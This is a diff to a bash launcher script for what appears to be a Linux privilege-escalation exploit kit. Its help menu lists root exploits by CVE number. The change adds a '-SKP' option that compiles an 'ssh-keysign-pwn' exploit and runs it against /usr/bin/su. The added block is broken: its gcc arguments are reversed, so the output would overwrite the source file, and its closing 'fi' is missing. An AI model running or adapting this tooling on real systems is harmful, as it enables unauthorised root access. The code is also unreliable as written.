@@ -39,7 +39,7 @@ if [[ "$*" == "-help" ]]; then
      echo "   -PKroot        Pack2TheRoot - CVE-2026-41651"
      echo "   -DirtyFrag     Dirty Frag - CVE-2026-43284"
      echo "   -Fragnesia     Fragnesia - CVE-2026-46300"
-     echo "   -DirtyDecrypt  pwn-key-ssh & chage - CVE-2026-31635"
+     echo "   -SKP           ssh-keysign-pwn - CVE-2026-46333"
      echo "   -PeditCow      PeditCow - CVE-2026-46331"
      echo " "
      echo "Cmds:"
@@ -149,12 +149,13 @@ if [[ "$*" == "-Fragnesia" ]]; then
      ${PWD}/exploit/Fragnesia/fg
 fi
 
-# ReadRoot
-if [[ "$*" == "-DirtyDecrypt" ]]; then
-     ${PWD}/exploit/chage
-     echo "-------------------------"
-     ${PWD}/exploit/ssh-keysign-pwn
-fi
+# ssh-keysign-pwn
+if [[ "$*" == "-SKP" ]]; then
+     gcc -o ${PWD}/exploit/ssh-keysign-pwn/exploit_vuln_target.c ${PWD}/exploit/ssh-keysign-pwn/skp
+     echo "[+] Compilation successfuly !"
+     echo "[+] PATH=${PWD}/exploit/ssh-keysign-pwn/skp"
+     echo "[+] Executing the binary..."
+     ${PWD}/exploit/ssh-keysign-pwn/skp /usr/bin/su
 
 # PeditCow
 if [[ "$*" == "-PeditCow" ]]; then
